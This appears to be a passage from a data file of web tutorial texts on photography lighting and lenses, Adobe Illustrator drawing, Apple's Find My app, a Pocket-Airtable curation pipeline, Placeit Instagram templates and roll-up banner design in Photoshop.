we\u2019re doing that with the knowledge that our camera can cope with that. Secondly, we\u2019re also heavily leaning into our knowledge of fluorescent fabrics and how they react with coloured light. Lastly, we are then combining all of that with some creative decisions in post-production that tie them all together. We are lightening the shadows without blowing the highlights (too much) and then we\u2019re pushing the colour tint to bring the whole image together. Simple, but incredibly effective when done well. \nGuess the Lighting\u2026 \nOccasionally I ask my Facebook community to guess the lighting in one of my shots and last week was one of those times with these images. Nearly every comment mentioned upwards of 3, 4, 5 and even 6 lights to achieve this. Many people also assumed I\u2019d used UV lights to pop the colours and most assumed that those lights were pink or orange. These were all very sensible suggestions and in all honesty, if I\u2019d been asked the same question, maybe I would have made the same suggestions too based on what I was seeing. \nFeel free to join in with discussion next time by joining us over here at my Jake Hicks Photography Facebook Page . \nBut I hope this setup is a good example of how to exploit your knowledge and thinking through a potential setup with the end goal in mind. Yes, I love to get as much done in-camera as I can. But I never shy away from using LR and PS to achieve something that is otherwise almost impossible any other way. These are creative decisions and they are unique to me and I hope that if you give this setup a try that you explore a variety of ways to push this look in multiple directions. After all, it\u2019s super simple to try so give it a go and let me know how you get on. \nAbout the Author \nJake Hicks is an editorial and fashion photographer who specializes in keeping the skill in the camera, not just on the screen.

      "text": "In this tutorial we\u2019ll be cooking a yummy vector taco in Adobe Illustrator, using basic geometric shapes in order to preserve a simple flat style. \nLet\u2019s begin! \nTutorial Details \nProgram: Adobe Illustrator CS6 \u2013 CC \nDifficulty: Intermediate \nTopics Covered: Shape Building, Live Corners, Pathfinder panel \nEstimated Completion Time: 20 minutes \nFinal Image: Delicious Taco \nStep 1 \nLet\u2019s start with a taco shell. Take the Rectangle Tool (M) and make a 165 x 120 px yellow shape. \nStep 2 \nTake the Direct Selection Tool (A), select both top corners of the rectangle and pull the circle marker of the Live Corners down to make the top part fully rounded. We can also adjust the Corner Radius manually by typing the exact value in the Corners window in the control panel on top. \nDo the same for the bottom of the shape but this time, make the corners less rounded. \nStep 3 \nNow let\u2019s add some minor details to the taco shell. Copy (Control-C) the shape and Paste in Front (Control-F) . Select the top shape. \nTake the Eraser Tool (Shift-E) . Hold down Alt and spread the selection over the top of the shape. Once you release the mouse button, the covered area will be deleted. Fill the remaining part with a slightly darker color, forming a shadow in the bottom of the shell. \nNow let\u2019s Copy (Control-C) the shell and Paste in Back (Control-B) . Move the back copy to the left by pressing the left arrow key a few times and fill it with a lighter yellow color for the highlight. \nStep 4 \nLet\u2019s add some texture to it. Take the Rectangle Tool (M) and make a 17 x 7 px rectangle. Make its corners fully rounded using the Direct Selection Tool (A) and the Live Corners feature. \nMake more copies of the created shape and spread them over the surface to make the taco shell textured. \nStep 5 \nNow let\u2019s draw a filling! First of all, open the Layers panel ( Window > Layers ) and create a New Layer beneath the taco layer by clicking the Create New Layer icon in the bottom of the panel. \nTake the Pencil Tool (N) and draw a wavy shape for the salad. Fill the shape with green color. \nStep 6 \nDraw another wavy shape on top of the salad and make its color a bit darker. \nStep 7 \nGrab the Ellipse Tool (L) and let\u2019s add some roasted pepper to the salad. Make a 45 x 45 px red circle and put a smaller and darker circle on top of it. Group (Control-G) both circles and add more copies, spreading them along the taco shell. \nStep 8 \nNow let\u2019s add a back part of the taco shell. First of all, open the Layers panel and drag and drop the taco layer over the Create New Layers icon (in the bottom of the panel) to duplicate the layer with all its contents. Move the created layer beneath the filling layer. \nNow we can select the taco back group and use the Selection Tool (V) while holding down Shift to move it to the left. \nDon\u2019t forget to make the back taco part somewhat darker, adding depth to our illustration. \nStep 9 \nLet\u2019s make an onion ring. Take the Ellipse Tool (L) and make a 55 x 55 px circle. Duplicate (Control-C > Control-F) the created shape and make the top copy a bit smaller ( 45 x 45 px ). \nSelect both circles and use the Minus Front function of the Pathfinder to cut the top circle out. Now we have a perfect onion ring! \nStep 10 \nLet\u2019s finish up with our delicious taco by putting some onion rings inside, varying their size. \n\u00a1Qu\u00e9 Delicioso! Our Taco is Finished! \nHere we have it guys, our perfect taco is ready to be eaten! I hope you\u2019ve enjoyed following this tutorial and discovered some new tips and tricks to use in your illustrations. Go ahead and add some more ingredients there, I\u2019m leaving it up to you! \nHave fun! \nThese icons link to social bookmarking sites where readers can share and discover new web pages.",

Let\u2019s setup Find My app for you so you can share your location, friends share their location or you can locate your devices using a single app. \nFirst things first, enable location services on your iPhone, iPad, iPod Touch or MacBook. \nAt first, Sign in your Apple ID. \nHead over to Settings. \nGo to Privacy Tab. \nChoose Location Services. \nEnable/Turn On location services. \nNow your device is ready for locating the devices, sharing location or finding friends on your iPhone, iPad or MacBook. \nApple has divided Find My app into three different sections. We are going to discuss them one by one here in detail. If you are reading this article, I am sure you will learn about this app completely. \nPeople \nDevices \nMe \nBefore proceeding next please note that, if you have an Apple Watch & AirPods paired with your iPhone, there is no need to add them manually. Now, let\u2019s come to the point and check all these three different tabs. \n1- People Tab \nStarting with the People Tab which is the first most on your screen. This tab lets you locate friends on your device. It works in the same way as that of previous \u2018Find Friends\u2019 application you were using on iOS 12 or previous. \nOn this Tab, you can check the map settings by clicking the information button available near to the lock screen button of your iPhone. Choose the map view between Map, Hybrid and Satellite. Also, you can set the distance between Miles and Kilometers. \nOn the other hand, if your friends or family members are sharing location with you, locate them easily. Tap any one of the friend\u2019s name to stop sharing location, contact details, and get directions to their location. \nYou can also remove the person from sharing list to stop getting their location on your device. Also, add them to favorite list within a single tap. \nIf you want to add a new person for sharing your location just hit the + Share My Location button, available at the bottom side. \n2- Devices Tab \nSecondly, you can locate your lost devices or active devices using this Tab. At first sight you will see a complete list of your all devices which are linked to the same Apple ID you are using on Find My app. \nIf you are using iPhone or iPad, Go to Settings > Your Name > Find My Tab > Enable Find My iPhone. All the other AirPods and Apple Watch linked with your any device will appear automatically. Also, you need to enable Find My on MacBook. Just open Settings > iCloud > Enable Find My Mac. \nYou can manage and locate your all devices on a single screen. Just tap on any of the devices like iPhone, to play sound, get directions to your device. You can also Erase device if the device is connected to internet. Activating \u201cMark As Lost\u201d was never easy without Find My app. \nWe believe, in the future you will be able to find your products using this application. Apple is planning to release Apple Tag as a separate product to buy in 2020 maybe. For example, you can use that tag your key chain. So, it will be easy to find when you lost them anywhere in the house or somewhere else. \nSo, we will talk about this Apple Tag in a separate article with more precise information like pricing and much more. That\u2019s all for this tab. \n3- Me Tab \nThe third tab is Me tab which show\u2019s your current device location and can be used to manage current device settings. For example, you can disable or enable share my location for all within a single tab. Also, it can be used to manage \u201cAllow friends Requests\u201d feature if you have privacy concerns. \nSo that\u2019s all for today.

      "title": "Learn to Draw a Leaves Composition in 10 Easy Steps!",
      "text": "Spring is finally here! Now that everything is growing and blooming, let\u2019s dedicate this tutorial to drawing an elegant bouquet made of ornate leaves. We\u2019ll be using simple shapes and transform effects to make the silhouettes and learn how to draw inside the objects. Let\u2019s start! \nTutorial Details \nProgram: Adobe Illustrator CS6 \u2013 CC \nDifficulty: Intermediate \nTopics Covered: Shape Building, Effects, Pathfinder panel, Draw Inside Function \nEstimated Completion Time: 20 minutes \nFinal Image: Leaves Composition \nStep 1 \nTake the Ellipse Tool (L) and let\u2019s make a 120 x 250 px green oval. Select its top and bottom anchor points with the Direct Selection Tool (A) and click Convert selected anchor points to corner in the control panel on top and make the tips pointed. \nStep 2 \nWe can use Guides to adjust the length of the anchor handles if we want to make the shape rounder. Simply turn on the Rulers (Control-R) and drag the Guide down onto the Artboard. When you\u2019ve finished with it, click the guide and hit Delete ( Backspace on Mac) to get rid of it. You can also turn it off in View > Guides > Clear Guides . \nUse the Pen Tool (P) and hold down Shift to add a vertical line across the leave. Open the Stroke panel (Window > Stroke) and set the Weight to 4 pt , Cap to Round Cap. \nLet\u2019s make sure that our shapes are perfectly centered. Select both the leaf and the line and open the Align panel (Window > Align ). Select Align to Artboard and click Horizontal Align Center to place both elements in the center. \nStep 3 \nDuplicate (Control-C > Control-V) the leaf and keep the copy somewhere aside, we\u2019ll need it for our next leaf. \nUse a Pen Tool (P) to create a small triangle in the top part of the leaf. Select both the leaf and the triangle and use the Minus Front function of the Pathfinder to cut it out. \nAdd another cut-out on the opposite side of the leaf. \nOur leaf is ready! Let\u2019s make another one! \nStep 4 \nRemember the copy of the leaf that we\u2019ve created in the previous step? Now its time to use it! First of all, let\u2019s change its color to light-blue. \nNext, select the leaf and go to Effect > Distort & Transform > Zig Zag . Set the Size to 6 px, Ridges per Segment to 1, Points to Smooth. \nStep 5 \nGo to Object > Expand Appearance to apply the effect and add some notches to the leaf. \nStep 6 \nLet\u2019s add some texture to our leaf. Keeping the leaf shape selected, head to the Tool panel and click Draw Inside in the very bottom of the panel (or press Shift-D to switch modes). You will see a dashed frame around the object, indicating that you can draw inside of it. \nTake the Pencil Tool (N) and select a light-blue Stroke color in the Color panel. Set the Weight to 4 pt in the Stroke panel and start adding wavy lines to the leaf. \nStep 7 \nOnce you\u2019ve added enough lines, switch back to Draw Normal mode by clicking the icon in the bottom of the Tool panel. \nStep 8 \nUse the same technique to add texture to our first leaf. Make the line pattern different, varying the direction of the lines. \nStep 9 \nNow that our leaves are ready, we can duplicate (Control-C > Control-V) them and combine the copies, making elegant compositions. Rotate the leaves and change their scale. We can also use the Reflect Tool (O) by double-clicking it to flip some of the leaves vertically, adding variety to our bouquet. \nUse the Ellipse Tool (L) while holding Shift to add small circles here and there. \nStep 10 \nAdd more details by placing dark copies of the leaves beneath the bouquet ( Shift-Control-[ ). \nCongratulations! Our Floral Composition is Finished! \nGreat work! Now we can use the bouquet as it is by adding some text to it or make more variations and unite them into an elegant floral set. I hope you\u2019ve found some useful tips and tricks in this tutorial to use in your future designs! \nHave fun! \nThese icons link to social bookmarking sites where readers can share and discover new web pages.",

      "title": "Wide Angle Lens Fundamentals: The Good and The Bad",
      "text": "Wide angle lenses aren\u2019t as easy to use as a lot of photographers think. They shrink the background and give the foreground strange proportions. They include all sorts of distractions from the scene in front of you, plus a lot of negative space. And yet\u2026 used right, wide angle lenses are incredible tools. This 7.5-minute video and article explain the ins and outs of using your wide angle for maximum effect. \nNegative Space \nOne of the most important things about wide angle lenses is their potential for extreme negative space in your photo. \nThe sky, fields, oceans, and so on \u2013 wide angle lenses cover such a huge area that they fill the frame with emptiness in a lot of scenes. That\u2019s not necessarily a bad thing, but it isn\u2019t always your goal, either. \nNegative space, of course, conveys its own emotions: isolation, loneliness, the smallness of your subject in the world. If those emotions are part of your goal, by all means, embrace the negative space inherent in wide angle lenses. \nOn the other hand, a lot of photographers want to fill the frame with their subject most of the time (or at least not surround it in a field of nothing). Wide angle lenses can do that, but it\u2019s only easy to do so in certain scenes. To avoid large regions of emptiness, you may need to get close to your subject or even just zoom in. \nFor example, the following scene (shot at 20mm) has way too much empty space in it, which is why it doesn\u2019t work: \nThe only way around it here was to zoom in to 70mm, where the photo is a lot better: \nCapture the Whole Scene \nThis one is a bit more controversial, but it\u2019s extremely relevant to the topic of wide angle lenses: they let you \u201cfit everything in\u201d \u2013 capture the entire scene in front of you at once. \nIt\u2019s controversial because it can lead to thoughtless compositions. Some first-time wide angle users will set 14mm, stand at a beautiful landscape, and fire off photo after photo. The logic? Beautiful place \u2192 capture the whole thing \u2192 guaranteed success. \nAnd, truthfully, that is a valid method for capturing good photos in certain cases. If there\u2019s a rainbow in front of you, and you want the whole thing in your photo, a wide angle is precisely the tool for the job. The same is true for subjects like the Milky Way, awesome clouds overhead, and \u2013 like in the video \u2013 slot canyons. \nOf course, if your default reason for using a wide angle lens is to capture the whole scene, it\u2019s probably a bad idea. The \u201cwhole scene\u201d often contains distractions that take away from the photo, not add to it. \nIn other words, unlike medium or telephoto lenses, wide angles have a hard time isolating the meat of the scene in front of you. That\u2019s fine if there\u2019s nothing annoying to be captured (your shadow, telephone poles, etc.), but it\u2019s often just not the case. Wide angle lenses will add plenty of distractions if you\u2019re not careful, just because they add a lot of everything. \nPerspective Distortion \nThe closer you get to your subject, the more exaggerated its proportions will appear. \nThis is actually true regardless of the lens you use. Perspective distortion is caused by your position, not your lens. But the problem with wide angles is that you need to get extremely close to your subject in order for it to fill the frame. Hence, you\u2019ll have an easy path to stretched-out corners and strange proportions. \nYou might like this distortion effect, but for a lot of photographers, it\u2019s a novelty rather than a goal for most photos. This means you need to choose your subjects wisely with a wide angle or stand farther back when you photograph them (making for more negative space)! \nIf you photograph something like sand dunes or slot canyons, this perspective distortion probably won\u2019t look unnatural, just because your subject is already somewhat abstract. It will often be a very good thing, even, since it emphasizes an interesting foreground. But for people\u2019s faces, manmade structures, and certain natural elements like trees, it can be a big concern. Strange proportions will stand out to a viewer and potentially overwhelm the rest of your photo\u2019s message. \nAnd it works both ways. When you exaggerate the foreground, you also shrink the background by comparison. Even a major subject on the horizon can start to look smaller than normal unless you\u2019re essentially at the base of a mountain. That\u2019s fine sometimes, like when your foreground is your subject, and the background doesn\u2019t matter as much. However, if the background is the most important part of your photo, a wide angle may not work as well as you\u2019d like. \nHandholding a Wide Angle \nA final point I\u2019d like to note: Wide angle lenses generally work better handheld than longer lenses do, especially if they have image stabilization or are used on a camera with IBIS. \nBecause wide angle lenses don\u2019t magnify blur from camera shake as much as telephotos, you can use a longer shutter speed handheld and still capture sharp photos. That\u2019s a big deal in a landscape like the slot canyons, where it can be tricky to bring along a tripod just because it\u2019s already such a tight squeeze. (Though I\u2019ll still argue that the benefits of a tripod outweigh the issues!) \nOn top of that, assuming you stand in place, wide angle lenses have more depth of field than telephotos. So, you can use a wider aperture like f/5.6 or f/8 rather than f/11 or f/16, while still capturing enough depth of field in your shot. \nA lot of landscape photographers use a tripod for almost everything, so these benefits aren\u2019t as important. But if you\u2019re more of a lightweight traveler, or you\u2019re taking pictures somewhere that doesn\u2019t allow tripods, wide angles can make your life a lot easier. \nConclusion \nI hope you found these tips to be useful and found some inspiration in the video\u2019s scenery. Wide angle lenses don\u2019t always work well, but when they do, they can give your photos a sense of three-dimensionally and depth that can be hard to capture any other way. \nP.S.

      "title": "How to build your own content curation pipeline",
      "text": "Build Your Own Content Curation Pipeline \nDecember 2019 \nI recently added a recommendations page to my website. The contents of that page are generated like so: \nI save things I like in Pocket . \nIFTTT transfers that data into Airtable . \nEvery 30 minutes, a function hosted on Repl.it does some post-processing on the data in Airtable. \nIn Airtable, I create a separate view for the different types of links (e.g. music, books, etc). \nRepl.it exposes some REST endpoints for each view. The endpoints pull data from Airtable and return it as RSS/Atom feeds. \nMy custom static site generator pulls the feed data from Repl.it and renders the recommendations page. \nTo help with content discovery, Repl.it also sends the feeds to Findka , a recommender system I started building recently. \nContinue for instructions on how to set up a pipeline like this for yourself. \nPocket \u2192 Airtable \nFirst, you need to set up an Airtable base with the right schema. The easiest way is to click \"Copy base\" (at the bottom of the iframe): \nEventually you'll want to delete the existing records from your copy of this base, but leave them in for now (they make good test data for generating the feeds). \nMake an IFTTT account if you haven't already, then go to ifttt.com/create . For the \"If\" service, select Pocket. You'll then have a few choices for a trigger. I didn't use Pocket before I set up this pipeline, so I chose \"Any new item\" as my trigger\u2014i.e. everything that goes into Pocket will be treated by the pipeline as a recommended item and will get sucked into Airtable. If you already use Pocket, you may want to choose \"New favorite item\" as the trigger instead. \nFor the \"That\" service, choose Airtable. As of writing this, there's only one available trigger: \"Create a new record\" (so use that one). Set the base to the one you just created, set Table to Links , and set Record content to ::airtable::Link::{{Url}} ::airtable::Title::{{Title}} ::airtable::Description::{{Excerpt}} ::airtable::Tags::{{Tags}} ::airtable::Image::{{ImageUrl}} . \nInstall the Pocket extension/app if needed and save something with it. I believe IFTTT will run within an hour, but to test it you can go to the settings page for your applet and click \"Check now.\" Make sure the new data shows up in Airtable. \nNote: if you add tags with Pocket, you must first add those values to the Tags field in Airtable. Otherwise, Airtable will reject the import. \nYou could ingest other things into Airtable as well, but Pocket is the only one I've done so far. I'd like to include my top tracks from last.fm at some point. \nPost-processing \nYou may want to derive additional information for the Airtable records. For example, I like to add tags based on the URL. Links from goodreads.com get tagged as \"book,\" imdb.com as \"movie,\" etc. \nMake an account at Repl.it if you don't already have one, then go to https://repl.it/@jobryant/Feeds and click \"fork.\" Rename the .env-TEMPLATE file to .env and then enter in the various API keys ( .env is only visible to the repl owner). You can get your Airtable API key from airtable.com/account and your Base ID from airtable.com/api . \nIf you'd like to send your public feeds to Findka automatically, get an API key from findka.com (under the settings tab after you log in). Otherwise, set EXPORT_TO_FINDKA to false in index.js . \nHit \"run.\" It'll take a minute for the dependencies to install, after which an embedded browser window will open and display the message \"Server running.\" The URL of the embedded window will be something like https://OrderlySereneRuby.yourusername.repl.co . In index.js , set the ROOT variable to that URL. Then click \"restart.\" \nIn the console, you'll see the message Send a GET request to https://YOUR-REPL.repl.co/process to process new Airtable records . When you hit that endpoint, it'll fetch all the records from Airtable where the Processed? field is unchecked. Each record's fields will be passed through the processRecord function, which returns the fields with any desired changes. Those changes will be saved to Airtable, and the Processed? column will be checked. Try hitting the endpoint and make sure the item you saved with Pocket earlier gets processed. \nFinally, make a free account at siteuptime.com and have it ping the /process endpoint every 30 minutes. (You can set up an applet on IFTTT that will ping Repl.it whenever an Airtable record is created, but it was unreliable for me. Repl.it sleeps during inactivity, and I think IFTTT was timing out while waiting for it to wake up. SiteUptime has been working great though.) \nFeeds \nGo back to Airtable. Notice there are several different views . I've set up each view with a different filter. For example, the \"music\" view includes only records that have the \"music\" tag. \nLook at the Feeds table. The values in the View name column must exactly match the names of any views you want to publish as feeds. You can include additional information for each feed if you like. \nWhen you start the server on Repl.it, it'll get the contents of the Feeds table and use that to start a bunch of endpoints. You probably saw some lines in the console output saying Published feed at ... . Each feed will be published in three formats: Atom, RSS and JSON. Whenever you update the Feeds table, you'll need to restart your repl. \nIn the build process for this website, I download the JSON and use it to render the recommendations page . On that page you'll notice a bunch of feed links. The build process also downloads the Atom feeds from Repl.it and includes them as-is in this website . \nFor stability, I like to keep this website static instead of fetching data from Repl.it on-demand. But if your website is already dynamic, you could use Javascript to render the pages instead so that the recommendations are always up-to-date. \nFindka \nIf you like feeds, do take a look at Findka . It doesn't have enough data to do anything useful yet, but that'll change once enough people import feeds of content they've curated. \nFor convenience, I'm planning to rebuild this pipeline within Findka so that people can use it without having to do all the setup work. However, I do like the user control and hackability that comes from using Airtable instead of Findka's database. Maybe I'll replace the other parts of the pipeline but keep Airtable. Let me know if you have an opinion. ",

      "text": "Need to create beautiful looking Instagram stories , but don\u2019t have the required tools to start doing so? \nWell, what if I told you that there\u2019s an easy way you can change that, using Placeit \u2019s online Instagram Story Templates . \nBelieve it or not, you can actually use templates for Instagram stories, such as an Instagram caption template, an Instagram story highlight template, an Instagram story cover template, or maybe an Instagram question template, which you can customize in order to tell the world what you feel. \nBy using an Instagram template, you remove any need for a third-party design app such as Photoshop, and rely completely on Placeit's online Instagram stories templates, which as you will see are incredibly easy to use and customize. \nFrom finding the perfect Instagram story template to how to make Instagram story templates, I'll walk you through the entire process and show you how easy it is to do so using just a couple of clicks here and there. \nSo, if you feel you're ready to design your own Instagram template story, grab a fresh cup of coffee and let's jump straight into it! \nFollow along with us over on our Envato Tuts+ YouTube Channel : \n1. What Is Placeit? \nBefore we begin, I wanted to take a couple of moments and quickly talk about what Placeit is and how it can do all the hard work for you. \nIf you aren\u2019t a designer yourself, most of the time that means that you won\u2019t have access to the tools and resources that designers usually use, such as Adobe Illustrator , Adobe Photoshop , Affinity Designer , Sketch , etc. \nBut what if sometimes you actually need to create something yourself, but don\u2019t feel like spending a lot of money on a graphics suite that you probably won\u2019t use all that often? \nWell, when this happens, Placeit can prove to be the perfect fit, since it comes with a set of dedicated online tools that help you create professional banners , mockups , logos , etc. using just a couple of clicks. \nThat being said, let\u2019s see how easy it is to design your own Instagram Story using Placeit \u2019s custom Instagram Story Templates . \n2. How to Access the Instagram Story Templates \nBefore we can begin working on the actual design, we first have to navigate to the correct section of the website in order to be able to access the Instagram Story Templates . \nTo do so, we're going to be using the horizontal navigation menu by heading over to Designs , and then clicking on Instagram Stories . \nAs soon as we click on the link, the website will redirect us to a new page, on the left side of which we'll find the Tags menu. This will allow us to filter the available designs using the provided categories. \n3. How to Use the Instagram Stories Templates to Make a Custom Instagram Story Design \nSo now that we've seen how easy it is to find the tool, let's take a look at the actual process of using it. \nThe first step that we need to take is decide which design template we're going to be using for the actual Instagram Story. As you've probably seen, there are quite a large number of really good-looking designs that we can choose from, depending on what we're aiming for. Here are some that I really liked. \nInsta Quote Template \nBlack Friday Sale Template \nSale Discount Template \nSave the Rainforest Template \nRomantic Post Template \nFor the current example, I decided to go with this autumn-themed design, which looks absolutely beautiful. \nOnce we've decided which design template we're going to be using, it's time to go through the process of customizing and making it our own. \nQuick tip: no matter what template you end up using, the layout will mostly be the same. On the left side you'll have all your text-related options, while on the right one you'll find all your background and design-related ones. \nStep 1 \nWe're going to quickly change the default text using the two input fields, by simply selecting and then overwriting it with our own. \nStep 2 \nOnce we've entered the desired text, we can go ahead and customize both the font and colors for the two text segments using the provided dropdown lists. \nFor this example, I'm going to set both fonts to TragicMarker , and the colors to white. \nStep 3 \nOnce we're done working on the text part of our design, we can move over to the right side of the page, where the first section that we'll see is Doodle , which lets us change the center illustration used by the template. \nWe can choose from one of the provided illustrations, or we can upload one of our own using the Custom Image button. We can even remove it completely by clicking the No Image button. \nFor this example, I'm going to go with the fox one since I really like how it looks, and it works better with the \"Sweater Weather\" message. \nStep 4 \nMoving on down we have Background , where again, we can go with one of the provided background images, upload a custom one of our own, or even remove it completely so that we can use a solid fill color. \nIn my case, I'm going to stick to the default image used by the template, since the colors blend perfectly, creating the autumn feel that I'm going for. \nStep 5 \nSince the template supports interactive editing, we can easily adjust the position and size of some of the text and shapes. Just select them, which will bring up their bounding box, and then click and drag them to another location, or drag the bounding box\u2019s squares outwards or inwards, depending on what you\u2019re trying to achieve. \nFor the current example, I'm going to enlarge the two text segments just a little bit to make them more visible. \nQuick tip : If for some reason we aren't happy with our changes, we can easily undo all of them using the Reset Layout button. \nGreat Job \nAs always, I hope you had fun working on this little project, and most importantly managed to learn something new and useful during the process. \nIf you have any questions, feel free to post them within the comments section and I\u2019ll get back to you as soon as I can! \nExpand Your Creative Skills! \nJust finished going through this quick tutorial, and feel like learning more of what it takes to become a visual creative? Well, if that\u2019s the case, then you\u2019re in luck since I\u2019ve put together a little list which should get you up and going in no time! \n15 Best Instagram Story Templates on Placeit for 2019 \nGet noticed with engaging and eye-catching Instagram Story posts by using these quick and easy templates from Placeit. \nMarie Gardiner \n17 Jan 2019 \nHow to Make Your Own T-Shirt Design in 5 Easy Steps \nAlways wanted to make your own T-shirt design, but lacked the courage since you didn\u2019t actually have the required tools or skills to start designing one?... \nAndrei Stefan \n26 Aug 2019 \nWhat Is a Mockup? \nAlways wondered what a \"mockup\" is but never managed to fully figure it out?

      "text": "Tajreen Hedayet of Tajreen&Co is back with a great holiday portrait tutorial that won\u2019t waste your time. In just two minutes (actually less) Hedayet covers four creative Christmas portrait ideas for anyone who wants to create some photos with a \u201ccommercial and catalog feel\u201d this holiday season. \nLighting for all of these ideas was pretty straight-forward. Hedayet set up a 7-foot reflective umbrella as her key light, with a large reflector on the ground providing fill from below, and all of the portraits were taken in front of a seamless green paper backdrop. \nShe covers four ideas in all: \nLet it Snow \u2013 Using white circle confetti and white balloons to represent snow, compositing multiple shots to ensure the confetti fills the whole frame. \nTinsel Town \u2013 Tinsel isn\u2019t just for Christmas trees. Tape tinsel curtains onto your backdrop in a \u201ccascading\u201d fashion to break up the background with some festive flair. \nRibbon Aura \u2013 Use various colored holiday ribbon to create concentric circles on the backdrop, framing your subject. \nPresents of Mind \u2013 Wrap some boxes and shoot these presents \u201cfloating\u201d against your backdrop. Then composite the floating presents into portraits of your subject holding even more boxes. The result puts your subject \u201cin a field of floating presents.\u201d \nAll four ideas are very simple, but the results would be right at home in a magazine spread about footie pajamas on sale at GAP (assuming your subject is wearing footie pajamas). What they aren\u2019t is your typical \u201ctwinkle light bokeh\u201d holiday shots we\u2019ve so used to seeing. \nSo if you want to turn your holiday card game up a notch, or are just looking for some creative holiday-themed portrait ideas, check out the full tutorial up top.

      "title": "How to Create a Custom Event Roll-Up Banner",
      "text": "There's no better way to welcome your guest to an event and let them know who you and your team are than with an event roll-up banner! So today we will look at the standard roll-up banner size and how to create a custom roll-up banner. \nYou might be asking, \"What is a roll-up banner?\" Roll-up banners are a critical resource for any group looking to stand out at a trade show or event. However, they can also be used in a shop or place of business to let people know who you are and what you do! \nToday we will be looking at how to create a roll-up banner design, and we'll also take a look at what sizes everything should be so that it looks just as crisp and clear in real life as it does in Photoshop. \nThis design is based on this template available for download: Multipurpose Roll-up Banners. \nWhat You'll Need \nYou will need the following resources in order to complete your project: \nFind more resources on Envato Elements ! For example, why not download some flyers for your event as well? \n1. How to Print a Rollup Banner \nStep 1 \nFirst, let's set up our document. We want to set things up very large, as we will be printing this very large. We will be making a 30 x 70-inch banner today! \nWe also want to make sure to set our document to a high resolution, otherwise known as our DPI. D will make sure our image will print crisp and clear! The ideal printing DPI is 300! \nDocument Settings: \nWidth: 30 in \nHeight: 70 in \nResolution: 300 \nStep 2 \nWhen designing a roll-up banner, you will want to keep bleed in mind. The main reason for bleed is to avoid white strips appearing along the edge of your banner when printed and cut. \nCreate guidelines around the edges of your canvas and then add a 1 inch bleed on the top, bottom left and right-hand sides of our canvas. \nHow Do You Create Guides? \nHit Control-R to open up the ruler tool, right-click on the ruler to change it to Inches , and then hold Alt and drag on the ruler to create guides. \nRemember that all the text should be within these bleed lines. \n2. How to Create a Header and a Footer \nStep 1 \nImport and place your header image onto your canvas, covering roughly one-third of the canvas. I will be using an image from this Isometric Flat Design image pack. \nStep 2 \nUsing the Rectangle Tool , create a white rectangle towards the bottom of the canvas. I have temporarily changed mine to red so you can see it more clearly. \nStep 3 \nIn a new document, open up image \"09\" from the linear Geometric Shapes Seamless Patterns pack. \nInvert the layer using Control -I. \nStep 4 \nGo to Edit > Define Pattern to create a new pattern of the image. \nStep 5 \nGo back into your roll-up banner file, and add a Pattern Overlay layer style to the bottom rectangle. \nBring down the Opacity of the pattern to 10%. \nStep 6 \nNext, we are going to set up our footer information which will consist of a website, telephone number, and email. All will be done in the same style. \nDownload the free Ionicons icon pack. And pick and choose your icons, changing them to a light blue #4ea2da . \nNow, in the font Myriad Pro , type the title of your section\u2014in this case, \"Website\"\u2014in a font size of around 34.50 pt and a medium-dark gray #505050 color. \nStep 7 \nDirectly below the section title, add your information\u2014in this case, a website name. \nUse the font Maxwell Sans Small Caps Bold , at around 39 pt in a dark gray #201f1f color. \nGo to Window > Character to open up the Character panel. Set the Tracking for both the title and the information to 50. \nGroup the icon, title, and information so that you can use them as templates for the other sections of the footer. \nStep 8 \nRepeat the above steps with all the other information, making sure everything stays centered and aligned. \nStep 9 \nFinish up the footer by adding a QR code if you have one! \nGroup all your footer layers into a group named \"Footer.\" \n3. How to Create a Gradient Side Column \nStep 1 \nFirst, create a vertical rectangle on the right-hand side of the canvas using the Rectangle Tool . The color doesn't matter. \nStep 2 \nAdd a Gradient Overlay layer style to the rectangle going from blue #4357a6 to light blue #56c8e5 . \nStep 3 \nUsing the Ellipse Tool , create three or four circles towards the top of the blue rectangle, but placing them behind the rectangle layer. Once again, the color doesn't matter. \nStep 4 \nSelect the rectangle column and all of the circle shapes and then Right-Click > Merge Shapes. \nStep 5 \nCreate some more circles floating around the canvas, almost like bubbles, applying the same blue gradient to each shape. \nStep 6 \nAgain using the Ionicons icon pack, find icons that represent what your company or business offers and place them in the blue gradient column. \nMake sure they are all centered. \nStep 7 \nBelow each icon, add a descriptor in Maxwell Sans Small Caps Bold set to white, at a size of around 95 pt and with a Character Spacing of 50. \nStep 8 \nFinally, use the Line Tool to create a blue #233f98 divider between each section. Set the Weight to 15 px. \nGroup each section into a labeled group, and then group the column and everything in it into a group named \"Your Services.\" \n4. How to Create Gradient Text \nStep 1 \nFirst, lay down any images you'd like to add to this section. Again I will be using an image from the Isometric Flat Design Concept Landing Page image pack. \nPlace this below the \"Your Services\" group. \nStep 2 \nType your slogan using the Maxwell Sans Small Caps Bold font face in large text, at least 155 pt. \nThe color doesn't matter. \nStep 3 \nCopy and paste the same Gradient Overlay layer effect that you applied to the column and the circles. \nGroup the text and image into a group named \"Slogan Text.\" \n5. How to Create Simple Typography \nStep 1 \nBeneath the \"Slogan Text\" group, type out some text describing what you can do for your customer, like \"Our support will help you grow your business.\" \nNow split the phrase in two, placing the first part on top of the second. \nStep 2 \nChange the top font to Myriad Pro set to black, with a Size of 67 pt and a Character Spacing of 50. \nStep 3 \nChange the bottom half of the phrase to Maxwell, again set to black and a Size of 117 pt with a Character Spacing of 50. \nGroup these two pieces of text, naming the group \"Header Text.\" \nStep 4 \nAdd in some of your company's numbers by using the same method as the footer! \nMake sure to group each section, to keep things from getting too confusing. \nStep 5 \nAdd an accent square to each number using the Rectangle Tool. \nAdd a Gradient Overlay layer style to each accent and the larger bold numbers going from blue #4357a6 to light blue #56c8e5 . \n6. How to incorporate Your Logo Into a Design \nStep 1 \nAdd your logo to the top right corner of the roll-up banner. \nStep 2 \nUsing the Rectangle Tool with no fill, but a black Stroke of 50 px , create a square the same size as your logo. Place it slightly lower and to the left, behind the logo. \nStep 3 \nFinally, copy and paste the same blue gradient that is on the right-hand column onto the square, and you are done! \nWe've Done It! \nAs always, keep experimenting with different techniques. Don't forget to post your version below, along with any questions, comments, or critiques! \nCreating a custom banner is excellent for those who love to design everything from scratch and tinker with every little detail; however, using templates for these kinds of things is also a great way to go! \nFrom real estate to fashion to medical events, there is going to be a roll-up banner template that is right for you. And the best part? They are all completely customizable! So you can take what you learned here and edit your template in confidence, saving time but still getting a product that is uniquely yours! \nCheck out some of the templates that Envato has to offer: \nMultipurpose Roll-up Banners \nMultipurpose Roll-up Banners PSD Template is a clean and unique design, using the latest trendy material design for corporate, multipurpose, business, and marketing 